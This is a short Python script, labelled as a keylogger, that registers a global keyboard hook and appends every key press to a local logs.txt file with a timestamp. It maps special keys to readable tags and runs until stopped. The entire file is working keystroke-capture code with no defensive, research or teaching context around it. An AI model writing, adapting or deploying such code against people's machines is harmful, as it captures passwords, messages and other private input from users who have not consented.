# keylogger
import keyboard
from datetime import datetime

timeStamp=(datetime.now())
current_timestamp=str(timeStamp.strftime('%d/%h/%Y %H:%M:%S'))

with open ('logs.txt','a', encoding='utf-8') as f:
    f.write("\n"+current_timestamp+"\n")
    
def on_key_event(event):
    # custom keys modification 
    keys={
        'space':' ',
        'enter':'\n',
        'esc':' <ESC> ',
        'backspace':' <BACKSPACE> ',
        'tab':' <TAB> ',
        'shift':' <SHIFT> ',
        'right shift':' <SHIFT> ',
        'ctrl':' <CTRL> ',
        'right ctrl':' <CTRL> ',
        'alt':' <ALT> ',
        'alt gr':' <ALT> ',
        'caps lock':' <CAPSLOCK> ',
        'left windows':' <WIN> ',
        'menu':' <MENU> ',
        'num lock':' <NUM> ',
        'delete':' <DEL> ',
        'insert':' <INSERT> ',
        'home':' <HOME> ',
        'page up':' <PAGE UP> ',
        'page down':' <PAGE DOWN> ',
        'print screen':' <PRINT SCREEN> ',
        'scroll lock':' <SCROLL LOCK> ',
        'pause':' <PAUSE> ',
        'end':' <END> ',
        'f1':' <F1> ',
        'f2':' <F2> ',
        'f3':' <F3> ',
        'f4':' <F4> ',
        'f5':' <F5> ',
        'f6':' <F6> ',
        'f7':' <F7> ',
        'f8':' <F8> ',
        'f9':' <F9> ',
        'f10':' <F10> ',
        'f11':' <F11> ',
        'f12':' <F12> ',
        'up':' ↑ ',
        'down':' ↓ ',
        'left':' ← ',
        'right':' → ',
        }
    if event.name in keys:
        event.name = keys[event.name]
        
    with open ('logs.txt','a', encoding='utf-8') as f:
        f.write(event.name)

keyboard.on_press(on_key_event)
print("caputering....")
keyboard.wait()  

